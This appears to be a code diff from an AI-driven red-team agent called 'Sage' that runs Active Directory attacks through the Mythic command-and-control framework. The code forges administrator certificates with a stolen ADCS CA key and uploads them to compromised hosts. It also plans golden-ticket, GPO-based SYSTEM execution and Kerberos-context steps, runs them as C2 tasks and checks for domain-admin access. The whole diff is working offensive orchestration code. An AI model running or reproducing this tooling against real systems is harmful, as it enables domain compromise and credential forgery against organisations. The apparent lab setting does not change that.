+                    "capability command plan completed, but required effects were not verified",
+                )
+                final_payload["stopped_after"] = "unresolved_effect_transaction"
+                return self._capability_executor_failure_json(
+                    final_payload,
+                    action_obj,
+                    input_values,
+                    callback_id,
+                    issued=all_issued,
+                    build_payload=build_payload,
+                    record_failed=True,
+                    failure_probe=accumulated_probe or {},
+                )
+            return json.dumps(final_payload, sort_keys=True)
+        except Exception as exc:
+            return self._capability_executor_failure_json({
+                "ok": False,
+                "verdict": "failed",
+                "missing": ["executor"],
+                "reason": str(exc),
+                "issued": [],
+            }, {}, {}, None, reason=str(exc), issued=[])
+
+    async def materialize_capability_inputs(
+        self,
+        action: Annotated[dict | str, (
+            "Capability action that needs runtime artifacts before build_capability_commands. "
+            "Currently supports adcs-certificate-auth actions rendered by the engagement planner."
+        )],
+        inputs: Annotated[dict | str | None, (
+            "Optional runtime values. For adcs-certificate-auth include callback_id/domain/account/ca_host "
+            "when not already in the action. Optional overrides: ca_pfx_password, forged_pfx_password, "
+            "forged_pfx_path, upload_command, upload_file_param, upload_path_param, timeout."
+        )] = None,
+    ) -> str:
+        """Prepare runtime artifacts for a generic capability and return builder-ready inputs.
+
+        This tool may issue staging tasks. For `adcs-certificate-auth`, Sage resolves a verified
+        `adcs-ca-private-key:<ca>@<domain>` artifact from the durable ledger, locally forges a
+        Windows PKINIT/smartcard-style account PFX, registers only that forged PFX in Mythic, uploads it
+        to the selected callback, and returns inputs for `build_capability_commands` with
+        `certificate_already_forged=true`. The CA signing key/PFX is never staged to the callback.
+        """
+        try:
+            if self.client is None:
+                return json.dumps({
+                    "ok": False,
+                    "missing": ["client"],
+                    "reason": "MythicAPIClient not initialized. Call login() first.",
+                }, sort_keys=True)
+            try:
+                from . import adcs_certificate_materializer
+                from . import capabilities
+                from . import engagement_ledger
+            except ImportError:
+                import adcs_certificate_materializer
+                import capabilities
+                import engagement_ledger
+
+            input_values = self._capability_tool_inputs(inputs)
+            action_obj = self._capability_tool_action(action, input_values, capabilities)
+            if action_obj is None:
+                return json.dumps({
+                    "ok": False,
+                    "missing": ["action"],
+                    "reason": "materialize_capability_inputs needs a capability action",
+                }, sort_keys=True)
+
+            capability = self._capability_text(getattr(action_obj, "name", "")).casefold()
+            if capability != "adcs-certificate-auth":
+                return json.dumps({
+                    "ok": False,
+                    "missing": ["capability"],
+                    "reason": f"runtime materializer does not support capability: {capability or '<empty>'}",
+                    "action": asdict(action_obj) if is_dataclass(action_obj) else {},
+                }, sort_keys=True)
+
+            await self._augment_capability_runtime_inputs(action_obj, input_values)
+            domain = self._capability_target_domain(action_obj, input_values) or self._capability_domain(action_obj, input_values)
+            account = self._capability_account(action_obj, input_values) or "administrator"
+            callback_id = self._capability_callback_id(action_obj, input_values)
+            ca_host = self._capability_text(
+                input_values.get("ca_host")
+                or getattr(action_obj, "intent", {}).get("ca_host")
+                or self._capability_target_host_from_context({"target": getattr(action_obj, "target", "")})
+            ).casefold()
+            if not callback_id:
+                return json.dumps({
+                    "ok": False,
+                    "missing": ["callback_id"],
+                    "reason": "adcs-certificate-auth materialization needs a target callback",
+                    "action": asdict(action_obj) if is_dataclass(action_obj) else {},
+                }, sort_keys=True)
+
+            await self._ensure_engagement_key()
+            ledger = engagement_ledger.load(self._eng_key())
+            artifact_dir = Path(_engagement_state_dir()) / "artifacts"
+            ca_password = self._capability_text(
+                input_values.get("ca_pfx_password")
+                or input_values.get("ca_cert_password")
+                or input_values.get("ca_certificate_password")
+                or os.environ.get("SAGE_ADCS_CA_PFX_PASSWORD")
+            )
+            forged_password = self._capability_text(
+                input_values.get("forged_pfx_password")
+                or input_values.get("forged_certificate_password")
+                or input_values.get("new_cert_password")
+                or input_values.get("certificate_password")
+            )
+            remote_path = self._capability_text(
+                input_values.get("forged_pfx_path")
+                or input_values.get("forged_certificate_path")
+                or input_values.get("new_cert_path")
+                or input_values.get("certificate_path")
+            )
+            account_sid = self._capability_text(
+                input_values.get("account_sid")
+                or input_values.get("target_sid")
+                or input_values.get("principal_sid")
+            )
+            if not account_sid and account.casefold() == "administrator":
+                domain_sid = await self._resolve_domain_sid(domain)
+                if domain_sid:
+                    account_sid = f"{domain_sid}-500"
+            sid_extension_encoding = self._capability_text(
+                input_values.get("sid_extension_encoding")
+                or input_values.get("account_sid_extension_encoding")
+                or input_values.get("sid_encoding")
+                or "utf8"
+            )
+            materialized = adcs_certificate_materializer.materialize_adcs_certificate_auth(
+                ledger=ledger,
+                artifact_dir=artifact_dir,
+                engagement_key=self._eng_key(),
+                domain=domain,
+                account=account,
+                ca_host=ca_host,
+                callback_id=callback_id,
+                account_sid=account_sid,
+                sid_extension_encoding=sid_extension_encoding,
+                ca_pfx_password=ca_password,
+                forged_pfx_password=forged_password,
+                remote_forged_pfx_path=remote_path,
+            )
+            if not materialized.ok:
+                return json.dumps({
+                    "ok": False,
+                    "missing": materialized.missing,
+                    "reason": materialized.reason,
+                    "action": asdict(action_obj) if is_dataclass(action_obj) else {},
+                }, sort_keys=True)
+
+            local_path = Path(str(materialized.inputs.get("_local_forged_pfx_path") or ""))
+            if not local_path.is_file():
+                return json.dumps({
+                    "ok": False,
+                    "missing": ["local_forged_pfx_path"],
+                    "reason": "materializer did not produce a local forged PFX",
+                }, sort_keys=True)
+
+            # NOT _register_file_dedup: the forged PFX is a per-engagement secret artifact — content-hash
+            # dedup could bind this op to a foreign operation's file. Hash-dedup is for static tool binaries only.
+            file_uuid = await mythic.register_file(self.client, filename=local_path.name, contents=local_path.read_bytes())
+            upload_command = self._capability_text(input_values.get("upload_command") or "upload")
+            file_param = self._capability_text(input_values.get("upload_file_param") or "File") or "File"
+            path_param = self._capability_text(input_values.get("upload_path_param") or "Path") or "Path"
+            upload_parameters = input_values.get("upload_parameters") if isinstance(input_values.get("upload_parameters"), dict) else None
+            if upload_parameters:
+                upload_parameters = dict(upload_parameters)
+                upload_parameters.setdefault(file_param, file_uuid)
+                upload_parameters.setdefault(path_param, materialized.inputs["forged_pfx_path"])
+            else:
+                upload_parameters = {
+                    file_param: file_uuid,
+                    path_param: materialized.inputs["forged_pfx_path"],
+                }
+            timeout_value = input_values.get("timeout")
+            try:
+                timeout = int(timeout_value) if timeout_value not in (None, "") else None
+            except (TypeError, ValueError):
+                timeout = None
+            upload_output = await self.upload_file_by_file_uuid(
+                upload_command,
+                upload_parameters,
+                file_uuid,
+                int(callback_id),
+                timeout=timeout,
+            )
+
+            merged_inputs = dict(input_values)
+            merged_inputs.update(materialized.inputs)
+            evidence = dict(materialized.evidence)
+            evidence.update({
+                "mythic_file_uuid": file_uuid,
+                "upload_command": upload_command,
+                "upload_parameters": {
+                    key: ("<file_uuid>" if key == file_param else value)
+                    for key, value in upload_parameters.items()
+                },
+                "upload_task_id": self._last_issued_task_display_id,
+                "callback_id": callback_id,
+            })
+            return json.dumps({
+                "ok": True,
+                "capability": capability,
+                "action": asdict(action_obj) if is_dataclass(action_obj) else {},
+                "inputs": self._materialized_inputs_for_response(merged_inputs),
+                "evidence": evidence,
+                "staged": {
+                    "mythic_file_uuid": file_uuid,
+                    "remote_path": materialized.inputs["forged_pfx_path"],
+                    "callback_id": callback_id,
+                    "upload_task_id": self._last_issued_task_display_id,
+                },
+                "upload_output_preview": self._capability_text(upload_output)[-800:],
+                "next": "Pass action and inputs to build_capability_commands, then issue the returned commands exactly.",
+            }, sort_keys=True)
+        except Exception as exc:
+            return json.dumps({
+                "ok": False,
+                "missing": ["materializer"],
+                "reason": str(exc),
+            }, sort_keys=True)
+
+    def _materialized_inputs_for_response(self, inputs: dict) -> dict:
+        out = {}
+        for key, value in inputs.items():
+            if str(key).startswith("_"):
+                continue
+            if key in {"ca_pfx_password", "ca_cert_password", "ca_certificate_password"}:
+                continue
+            out[key] = value
+        return out
+
+    async def _capability_build_command_payload(self, action, inputs: dict) -> dict:
+        try:
+            raw = await self.build_capability_commands(action, inputs)
+            parsed = json.loads(raw)
+            return parsed if isinstance(parsed, dict) else {
+                "ok": False,
+                "missing": ["builder"],
+                "reason": "capability builder did not return a JSON object",
+                "commands": [],
+            }
+        except Exception as exc:
+            return {
+                "ok": False,
+                "missing": ["builder"],
+                "reason": str(exc),
+                "commands": [],
+            }
+
+    def _capability_current_context_preflight_payload(self, action, inputs: dict, capabilities_mod) -> dict:
+        try:
+            try:
+                from . import mythic_capability_adapter
+            except ImportError:
+                import mythic_capability_adapter
+
+            capability = self._capability_text(getattr(action, "name", "")).casefold()
+            target_domain = (
+                self._capability_target_domain(action, inputs)
+                or self._capability_domain(action, inputs)
+                or self._capability_source_domain(action, inputs)
+                or self._capability_account_domain(action, inputs)
+            )
+            if not target_domain:
+                return {
+                    "ok": False,
+                    "missing": ["domain"],
+                    "reason": "current-context preflight needs a target domain",
+                    "commands": [],
+                }
+            proof_host = self._capability_text(
+                inputs.get("proof_host")
+                or inputs.get("service_host")
+                or inputs.get("target_host")
+                or inputs.get("dc")
+                or inputs.get("domain_controller")
+            )
+            proof_resource = self._capability_text(
+                inputs.get("proof_resource")
+                or inputs.get("service_resource")
+                or inputs.get("target_resource")
+                or inputs.get("proof_path")
+                or inputs.get("proof_unc")
+            )
+            if not proof_resource and proof_host:
+                share = "SYSVOL" if capability == "ensure-account-kerberos-context" else "C$"
+                proof_resource = f"\\\\{proof_host}\\{share}"
+            if not proof_resource:
+                proof_resource = "{{kerberos_service_resource}}"
+
+            steps = [
+                capabilities_mod.CapabilityExecutionStep(
+                    operation="kerberos-ticket-list",
+                    parameters={
+                        "domain": target_domain,
+                        **({
+                            "account": self._capability_account(action, inputs),
+                        } if capability == "ensure-account-kerberos-context" and self._capability_account(action, inputs) else {}),
+                        "target_context": "current",
+                        "store": "current",
+                    },
+                    capability=self._capability_text(getattr(action, "name", "")),
+                    purpose=f"inventory the current Kerberos context for {target_domain}",
+                    expected_probe=(
+                        "extract_account_ticket_cache_probe"
+                        if capability == "ensure-account-kerberos-context"
+                        else "extract_ticket_cache_probe"
+                    ),
+                ),
+                capabilities_mod.CapabilityExecutionStep(
+                    operation="kerberos-context-service-proof",
+                    parameters={
+                        "domain": target_domain,
+                        "resource": proof_resource,
+                        "target_context": "current",
+                        "store": "current",
+                        "action": "list",
+                        "requires_import": False,
+                    },
+                    capability=self._capability_text(getattr(action, "name", "")),
+                    purpose=(
+                        "prove whether the current callback context already has required service access "
+                        "before building or importing a ticket"
+                    ),
+                    expected_probe="extract_ticket_probe",
+                    prerequisites=["context:current-kerberos-context"],
+                ),
+            ]
+            execution_plan = capabilities_mod.CapabilityExecutionPlan(
+                True,
+                steps=steps,
+                reason="built keyless current-context preflight plan",
+            )
+            adapter_config = inputs.get("mythic_adapter") if isinstance(inputs.get("mythic_adapter"), dict) else inputs
+            command_plan = mythic_capability_adapter.build_mythic_capability_commands(execution_plan, adapter_config)
+            return self._capability_command_plan_payload(action, execution_plan, command_plan)
+        except Exception as exc:
+            return {
+                "ok": False,
+                "missing": ["preflight_builder"],
+                "reason": str(exc),
+                "commands": [],
+            }
+
+    async def _ensure_capability_executor_proof_target(self, action, inputs: dict) -> None:
+        capability = self._capability_text(getattr(action, "name", "")).casefold()
+        if capability not in {
+            "adcs-certificate-auth",
+            "forge-golden-ticket",
+            "gpo-controlled-system-exec",
+            "ensure-kerberos-context",
+            "ensure-account-kerberos-context",
+        }:
+            return
+        if capability == "gpo-controlled-system-exec":
+            intent = getattr(action, "intent", {}) if isinstance(getattr(action, "intent", {}), dict) else {}
+            explicit_proof_path = self._capability_text(
+                inputs.get("proof_path")
+                or inputs.get("proof_unc")
+                or intent.get("proof_path")
+                or intent.get("proof_unc")
+            )
+            if explicit_proof_path:
+                inputs.setdefault("proof_path", explicit_proof_path)
+                inputs.setdefault("proof_unc", explicit_proof_path)
+                return
+            if self._capability_text(inputs.get("proof_path") or inputs.get("proof_unc")):
+                return
+            domain = self._capability_domain(action, inputs)
+            gpo = self._capability_text(
+                inputs.get("gpo")
+                or inputs.get("gpo_name")
+                or inputs.get("gponame")
+                or intent.get("gpo")
+                or intent.get("gpo_name")
+                or intent.get("gponame")
+            ).casefold()
+            gpo_guid = self._capability_text(
+                inputs.get("gpo_guid")
+                or inputs.get("guid")
+                or inputs.get("gpo_object_guid")
+                or intent.get("gpo_guid")
+                or intent.get("guid")
+                or intent.get("gpo_object_guid")
+            ).strip().strip("{}")
+            affected = {
+                self._capability_text(host).split(".", 1)[0].casefold()
+                for host in (inputs.get("affected_dc_hosts") or intent.get("affected_dc_hosts") or [])
+                if self._capability_text(host)
+            }
+            current_host = self._capability_text(
+                inputs.get("current_host")
+                or inputs.get("callback_host")
+                or inputs.get("foothold_host")
+                or inputs.get("local_host")
+            ).split(".", 1)[0].casefold()
+            if domain and gpo_guid and (affected and current_host not in affected):
+                slug = self._capability_slug(gpo or gpo_guid)
+                proof_path = (
+                    f"\\\\{domain}\\SYSVOL\\{domain}\\Policies\\{{{gpo_guid}}}"
+                    f"\\Machine\\Preferences\\ScheduledTasks\\sage_gpo_{slug}_whoami.txt"
+                )
+                inputs["proof_path"] = proof_path
+                inputs["proof_unc"] = proof_path
+            return
+        default_share = "SYSVOL" if capability == "ensure-account-kerberos-context" else "C$"
+        if capability == "ensure-account-kerberos-context":
+            self._sanitize_account_context_proof_target(action, inputs)
+        self._normalize_capability_service_proof_target(action, inputs, default_share=default_share)
+        if capability == "ensure-kerberos-context":
+            self._sanitize_admin_context_proof_target(action, inputs, default_share=default_share)
+        if self._capability_text(
+            inputs.get("proof_resource")
+            or inputs.get("service_resource")
+            or inputs.get("target_resource")
+            or inputs.get("proof_path")
+            or inputs.get("proof_unc")
+        ):
+            return
+        if capability == "adcs-certificate-auth":
+            target_domain = (
+                self._capability_target_domain(action, inputs)
+                or self._capability_domain(action, inputs)
+                or self._capability_account_domain(action, inputs)
+            )
+            ca_host = self._capability_text(
+                inputs.get("ca_host")
+                or getattr(action, "intent", {}).get("ca_host")
+            )
+            host = self._capability_host_name(ca_host, target_domain)
+            if host:
+                inputs.setdefault("proof_host", host)
+                inputs.setdefault("proof_resource", f"\\\\{host}\\{default_share}")
+                inputs.setdefault("proof_service", "cifs")
+                return
+        domain = (
+            self._capability_target_domain(action, inputs)
+            or self._capability_domain(action, inputs)
+            or self._capability_account_domain(action, inputs)
+        )
+        await self._augment_capability_ticket_proof_target(inputs, domain)
+
+    def _normalize_capability_service_proof_target(
+        self,
+        action,
+        inputs: dict,
+        *,
+        default_share: str = "C$",
+    ) -> None:
+        """Normalize model-supplied service proof targets before the adapter emits a command."""
+        if not isinstance(inputs, dict):
+            return
+        resource_keys = ("proof_resource", "service_resource", "target_resource", "proof_unc", "proof_path")
+        resource = ""
+        for key in resource_keys:
+            resource = self._capability_text(inputs.get(key)).strip()
+            if resource:
+                break
+        if not resource or self._capability_service_resource_is_explicit(resource):
+            return
+
+        normalized_resource = resource.strip().strip("\\/").rstrip(".").casefold()
+        target_domain = (
+            self._capability_target_domain(action, inputs)
+            or self._capability_domain(action, inputs)
+            or self._capability_account_domain(action, inputs)
+        )
+        source_domain = self._capability_source_domain(action, inputs)
+        known_domains = {
+            self._capability_text(item).strip().strip("\\/").rstrip(".").casefold()
+            for item in (target_domain, source_domain)
+            if self._capability_text(item)
+        }
+
+        if normalized_resource in known_domains:
+            for key in resource_keys:
+                if self._capability_text(inputs.get(key)).strip().strip("\\/").rstrip(".").casefold() == normalized_resource:
+                    inputs.pop(key, None)
+            return
+
+        if any(sep in resource for sep in ("\\", "/")) or ":" in resource:
+            return
+
+        for key in resource_keys:
+            if self._capability_text(inputs.get(key)).strip() == resource:
+                inputs.pop(key, None)
+        if not self._capability_text(inputs.get("proof_host") or inputs.get("service_host") or inputs.get("target_host")):
+            host = self._capability_host_name(resource, target_domain)
+            if host:
+                inputs["proof_host"] = host
+                inputs.setdefault("proof_resource", f"\\\\{host}\\{default_share}")
+                inputs.setdefault("proof_service", "cifs")
+
+    def _sanitize_admin_context_proof_target(
+        self,
+        action,
+        inputs: dict,
+        *,
+        default_share: str = "C$",
+    ) -> None:
+        """Require admin-only service proof for callback-scoped privileged Kerberos contexts."""
+        if not isinstance(inputs, dict):
+            return
+        capability = self._capability_text(getattr(action, "name", "")).casefold()
+        if capability != "ensure-kerberos-context":
+            return
+        resource_keys = ("proof_resource", "service_resource", "target_resource", "proof_unc", "proof_path")
+        selected_resource = ""
+        for key in resource_keys:
+            selected_resource = self._capability_text(inputs.get(key)).strip()
+            if selected_resource:
+                break
+        if not selected_resource:
+            return
+        share = self._capability_service_resource_share(selected_resource)
+        if share not in {"sysvol", "netlogon"}:
+            return
+        host = self._capability_service_resource_host(selected_resource)
+        for key in resource_keys:
+            inputs.pop(key, None)
+        if host:
+            inputs["proof_host"] = host
+            inputs["proof_resource"] = f"\\\\{host}\\{default_share}"
+            inputs["proof_service"] = "cifs"
+        inputs["proof_target_sanitized"] = (
+            f"replaced low-privileged {share.upper()} proof target; "
+            "privileged Kerberos context proof requires an admin-only service"
+        )
+
+    def _sanitize_account_context_proof_target(self, action, inputs: dict) -> None:
+        """Keep account-context proofs scoped to the account's own domain.
+
+        A model may ask to prove a Seven Kingdoms account context by listing an ESSOS
+        admin share. That tests authorization the account does not have and turns a
+        context proof into a target-domain access proof. Account context should prove
+        a TGT plus same-domain service access, normally SYSVOL on a domain controller.
+        """
+        if not isinstance(inputs, dict):
+            return
+        domain = (
+            self._capability_domain(action, inputs)
+            or self._capability_account_domain(action, inputs)
+        )
+        domain_cf = self._capability_text(domain).strip().strip(".").casefold()
+        if not domain_cf:
+            return
+        proof_domain = self._capability_service_proof_domain(inputs)
+        if not proof_domain or proof_domain == domain_cf:
+            return
+        for key in (
+            "proof_resource",
+            "service_resource",
+            "target_resource",
+            "proof_unc",
+            "proof_path",
+            "proof_host",
+            "service_host",
+            "target_host",
+            "proof_service",
+        ):
+            inputs.pop(key, None)
+        inputs["proof_target_sanitized"] = (
+            f"discarded cross-domain proof target {proof_domain}; "
+            f"account context proof is scoped to {domain_cf}"
+        )
+
+    def _capability_service_proof_domain(self, inputs: dict) -> str:
+        for key in ("proof_resource", "service_resource", "target_resource", "proof_unc", "proof_path"):
+            domain = self._capability_service_resource_domain(inputs.get(key))
+            if domain:
+                return domain
+        for key in ("proof_host", "service_host", "target_host", "dc", "domain_controller"):
+            _host, domain = self._capability_host_domain(inputs.get(key))
+            if domain:
+                return domain
+        return ""
+
+    def _capability_service_resource_domain(self, value) -> str:
+        text = self._capability_text(value).strip().strip('"')
+        if not text:
+            return ""
+        normalized = text.replace("/", "\\")
+        host = ""
+        if normalized.startswith("\\\\"):
+            host = normalized.lstrip("\\").split("\\", 1)[0]
+        else:
+            low = normalized.casefold()
+            for prefix in ("cifs\\", "host\\", "ldap\\", "http\\", "https\\", "wsman\\", "winrm\\"):
+                if low.startswith(prefix):
+                    host = normalized[len(prefix):].strip("\\").split("\\", 1)[0]
+                    break
+        if not host and "\\" not in normalized and ":" not in normalized:
+            host = normalized
+        if not host:
+            return ""
+        _short, domain = self._capability_host_domain(host)
+        return domain
+
+    def _capability_service_resource_host(self, value) -> str:
+        text = self._capability_text(value).strip().strip('"')
+        if not text:
+            return ""
+        normalized = text.replace("/", "\\")
+        if normalized.startswith("\\\\"):
+            return normalized.lstrip("\\").split("\\", 1)[0]
+        low = normalized.casefold()
+        for prefix in ("cifs\\", "host\\", "ldap\\", "http\\", "https\\", "wsman\\", "winrm\\"):
+            if low.startswith(prefix):
+                return normalized[len(prefix):].strip("\\").split("\\", 1)[0]
+        return ""
+
+    def _capability_service_resource_share(self, value) -> str:
+        text = self._capability_text(value).strip().strip('"')
+        if not text:
+            return ""
+        normalized = text.replace("/", "\\")
+        if normalized.startswith("\\\\"):
+            parts = normalized.lstrip("\\").split("\\")
+            if len(parts) >= 2:
+                return parts[1].strip().casefold()
+        return ""
+
+    def _capability_service_resource_is_explicit(self, value) -> bool:
+        text = self._capability_text(value).strip().strip('"')
+        if not text:
+            return False
+        if text.startswith("{{"):
+            return True
+        normalized = text.replace("/", "\\")
+        if normalized.startswith("\\\\"):
+            return True
+        return len(normalized) >= 3 and normalized[1] == ":" and normalized[2] == "\\"
+
+    def _capability_needs_runtime_materialization(self, action, inputs: dict) -> bool:
+        capability = self._capability_text(getattr(action, "name", "")).casefold()
+        if capability != "adcs-certificate-auth":
+            return False
+        if self._capability_input_bool(inputs, "certificate_already_forged"):
+            return False
+        if self._capability_input_bool(inputs, "skip_certificate_forge"):
+            return False
+        if self._capability_input_bool(inputs, "pre_forged_certificate"):
+            return False
+        intent = getattr(action, "intent", {}) if isinstance(getattr(action, "intent", {}), dict) else {}
+        if any(bool(intent.get(key)) for key in ("certificate_already_forged", "skip_certificate_forge", "pre_forged_certificate")):
+            return False
+        if self._capability_text(
+            inputs.get("ca_pfx_path")
+            or inputs.get("ca_cert_path")
+            or inputs.get("ca_certificate_path")
+            ):
+                return False
+        return True
+
+    async def _execute_capability_account_context_prerequisite(
+        self,
+        action,
+        inputs: dict,
+        callback_id: int,
+        timeout: int | None,
+        capabilities_mod,
+    ) -> dict:
+        """Ensure account-scoped capabilities run under the expected current Kerberos context."""
+        capability = self._capability_text(getattr(action, "name", "")).casefold()
+        if capability not in {"read-managed-local-admin-secret"}:
+            return {"status": "skipped", "issued": []}
+        if self._capability_input_bool(inputs, "skip_account_context_repair"):
+            return {"status": "skipped", "issued": []}
+
+        account = self._capability_account(action, inputs)
+        account_domain = self._capability_account_domain(action, inputs)
+        if not account or not account_domain:
+            return {"status": "skipped", "issued": []}
+
+        context_action = capabilities_mod.CapabilityAction(
+            name="ensure-account-kerberos-context",
+            target=f"domain={account_domain};account={account};callback={callback_id}",
+            preconditions=[],
+            effects=[f"kerberos-account-context:{account}@{account_domain}@callback:{callback_id}"],
+            intent={
+                "capability": "ensure-account-kerberos-context",
+                "domain": account_domain,
+                "account": account,
+                "callback_id": str(callback_id),
+            },
+            verifier={},
+            reason="refresh current callback token before account-scoped capability execution",
+            source_facts=[],
+        )
+        context_inputs = {
+            "domain": account_domain,
+            "account": account,
+            "callback_id": str(callback_id),
+            "force_revalidate": True,
+        }
+        if timeout is not None:
+            context_inputs["timeout"] = timeout
+        raw = await self.execute_capability(context_action, context_inputs)
+        try:
+            payload = json.loads(raw)
+        except Exception:
+            payload = {
+                "ok": False,
+                "verdict": "failed",
+                "reason": raw,
+                "issued": [],
+            }
+        if not isinstance(payload, dict):
+            payload = {
+                "ok": False,
+                "verdict": "failed",
+                "reason": "account-context prerequisite returned a non-object result",
+                "issued": [],
+            }
+        if payload.get("ok") is True or self._capability_text(payload.get("verdict")).casefold() == "achieved":
+            return {
+                "status": "achieved",
+                "issued": payload.get("issued") if isinstance(payload.get("issued"), list) else [],
+                "reason": payload.get("reason") or "account Kerberos context is usable",
+            }
+        return {
+            "status": "failed",
+            "verdict": payload.get("verdict") or "failed",
+            "reason": payload.get("reason") or "account Kerberos context could not be refreshed",
+            "issued": payload.get("issued") if isinstance(payload.get("issued"), list) else [],
+        }
+
+    async def _execute_capability_current_context_preflight(
+        self,
+        action,
+        inputs: dict,
+        callback_id: int,
+        timeout: int | None,
+        capabilities_mod,
+    ) -> dict:
+        capability = self._capability_text(getattr(action, "name", "")).casefold()
+        if capability not in {
+            "adcs-certificate-auth",
+            "forge-golden-ticket",
+            "ensure-kerberos-context",
+            "ensure-account-kerberos-context",
+        }:
+            return {"status": "skipped", "issued": [], "ran": False}
+
+        preflight_inputs = dict(inputs)
+        if capability == "adcs-certificate-auth":
+            # Build only enough of the plan to validate the current context. This avoids staging a
+            # new certificate or creating another NetOnly logon session when the callback already has
+            # usable service access.
+            preflight_inputs.setdefault("certificate_already_forged", True)
+            preflight_inputs.setdefault("skip_certificate_forge", True)
+        await self._ensure_capability_executor_proof_target(action, preflight_inputs)
+        if capability in {"forge-golden-ticket", "ensure-kerberos-context", "ensure-account-kerberos-context"}:
+            payload = self._capability_current_context_preflight_payload(
+                action,
+                preflight_inputs,
+                capabilities_mod,
+            )
+        else:
+            payload = await self._capability_build_command_payload(action, preflight_inputs)
+        if not payload.get("ok"):
+            missing = set(payload.get("missing") or [])
+            if missing and missing <= {"ca_pfx_path", "forged_pfx_path", "forged_pfx_password"}:
+                return {"status": "skipped", "issued": [], "ran": False}
+            return {
+                "status": "failed",
+                "verdict": "failed",
+                "reason": payload.get("reason") or "current-context preflight build failed",
+                "issued": [],
+                "ran": False,
+            }
+
+        issued: list[dict] = []
+        ran = False
+        accumulated_probe: dict = {}
+        for command_obj in list(payload.get("commands") or []):
+            if not self._capability_executor_is_current_context_preflight(command_obj):
+                break
+            unresolved = self._capability_executor_unresolved_placeholders(command_obj)
+            if unresolved:
+                if self._capability_executor_is_current_context_service_proof(command_obj):
+                    return {
+                        "status": "not_achieved",
+                        "reason": "current-context service proof target was unresolved; continuing to capability materialization",
+                        "missing": sorted(unresolved),
+                        "issued": issued,
+                        "ran": ran,
+                    }
+                return {
+                    "status": "failed",
+                    "verdict": "failed",
+                    "reason": "current-context preflight has unresolved runtime placeholders",
+                    "missing": sorted(unresolved),
+                    "issued": issued,
+                    "ran": ran,
+                }
+            item = await self._execute_capability_command(command_obj, callback_id, timeout)
+            item["preflight"] = True
+            issued.append(item)
+            ran = True
+            output = self._capability_text(item.get("_output"))
+            expected_probe = self._capability_text(command_obj.get("expected_probe"))
+            if expected_probe in {
+                "extract_ticket_probe",
+                "extract_account_ticket_probe",
+                "extract_ticket_cache_probe",
+                "extract_account_ticket_cache_probe",
+            }:
+                probe, verification = self._capability_executor_verify_output(
+                    action,
+                    preflight_inputs,
+                    callback_id,
+                    output,
+                    command_obj,
+                    capabilities_mod,
+                    allow_preflight=True,
+                )
+                if verification is not None:
+                    if probe:
+                        accumulated_probe = self._capability_executor_merge_probe(accumulated_probe, probe)
+                        verification = capabilities_mod.verify_capability(
+                            self._capability_text(getattr(action, "name", "")),
+                            accumulated_probe,
+                        )
+                        probe = dict(accumulated_probe)
+                    item["verify_verdict"] = verification.verdict
+                    item["verify_reason"] = verification.reason
+                    if (
+                        self._capability_executor_is_current_context_service_proof(command_obj)
+                        and verification.verdict == "achieved"
+                    ):
+                        if not self._capability_action_effects_achieved(action):
+                            self.record_capability_result(
+                                action,
+                                probe or accumulated_probe or {},
+                                evidence={
+                                    "source": "execute_capability_preflight",
+                                    "provenance": "run",
+                                    "mythic_task_id": item.get("task_id"),
+                                    "callback_id": callback_id,
+                                    "command": item.get("command"),
+                                },
+                            )
+                        return {"status": "achieved", "issued": issued, "ran": ran}
+                if (
+                    not self._capability_executor_is_current_context_service_proof(command_obj)
+                    and self._capability_executor_task_failed(item)
+                ):
+                    return {
+                        "status": "failed",
+                        "verdict": "failed",
+                        "reason": item.get("failure_reason") or "current-context inventory failed",
+                        "issued": issued,
+                        "ran": ran,
+                    }
+                continue
+            if self._capability_executor_task_failed(item):
+                return {
+                    "status": "failed",
+                    "verdict": "failed",
+                    "reason": item.get("failure_reason") or "current-context inventory failed",
+                    "issued": issued,
+                    "ran": ran,
+                }
+        return {"status": "not_achieved", "issued": issued, "ran": ran}
+
+    async def _execute_capability_command(
+        self,
+        command_obj: dict,
+        callback_id: int,
+        timeout: int | None,
+    ) -> dict:
+        command_name = self._capability_text(command_obj.get("command"))
+        parameters = command_obj.get("parameters", "")
+        if command_name == "wait_for_seconds":
+            seconds = 0
+            reason = ""
+            if isinstance(parameters, dict):
+                try:
+                    seconds = int(parameters.get("seconds") or 0)
+                except (TypeError, ValueError):
+                    seconds = 0
+                reason = self._capability_text(parameters.get("reason"))
+            output = await self.wait_for_seconds(seconds or 300, reason=reason)
+            task_id = None
+        else:
+            if self._capability_executor_allows_repeated_probe(command_obj):
+                try:
+                    self._task_failure_counts.pop(
+                        self._task_failure_key(command_name, int(callback_id), parameters),
+                        None,
+                    )
+                except Exception:
+                    pass
+            output = await self.issue_task_and_waitfor_task_output(
+                command_name,
+                parameters,
+                callback_id,
+                timeout=timeout,
+            )
+            task_id = getattr(self, "_last_issued_task_display_id", None)
+        result_class = command_builder.classify_result(command_name, output)
+        item = {
+            "command": command_name,
+            "purpose": self._capability_text(command_obj.get("purpose")),
+            "expected_probe": self._capability_text(command_obj.get("expected_probe")),
+            "produces": list(command_obj.get("produces") or []),
+            "consumes": list(command_obj.get("consumes") or []),
+            "parameters": self._capability_executor_safe_parameters(parameters),
+            "task_id": task_id,
+            "callback_id": callback_id,
+            "result_class": result_class,
+            "output_preview": self._capability_executor_output_preview(output),
+            "_output": self._capability_text(output),
+        }
+        if self._capability_executor_task_failed(item):
+            item["failure_reason"] = self._capability_executor_failure_reason(output)
+        return item
+
+    def _capability_executor_verify_output(
+        self,
+        action,
+        inputs: dict,
+        callback_id: int,
+        output: str,
+        command_obj: dict,
+        capabilities_mod,
+        *,
+        allow_preflight: bool = False,
+    ):
+        capability = self._capability_text(getattr(action, "name", "")).casefold()
+        expected_probe = self._capability_text(command_obj.get("expected_probe")).casefold()
+        if capability == "gpo-controlled-system-exec":
+            if expected_probe not in {
+                "extract_gpo_system_exec_probe",
+                "extract_gpo_domain_admin_membership_probe",
+            }:
+                return None, None
+            if expected_probe == "extract_gpo_domain_admin_membership_probe":
+                membership = self._extract_domain_admin_membership_probe(output)
+                probe = {
+                    "domain_admin_membership_proven": bool(membership.get("domain_admin")),
+                    "system_command_succeeded": bool(membership.get("domain_admin")),
+                    "group_query_succeeded": bool(membership.get("group_query_succeeded")),
+                    "principal_present": bool(membership.get("principal_present")),
+                    "principal_candidates": list(membership.get("principal_candidates") or []),
+                    "access_denied": bool(membership.get("access_denied")),
+                    "callback_id": self._capability_text(callback_id),
+                }
+            else:
+                probe = dict(capabilities_mod.extract_gpo_system_exec_probe(output))
+                probe["callback_id"] = self._capability_text(callback_id)
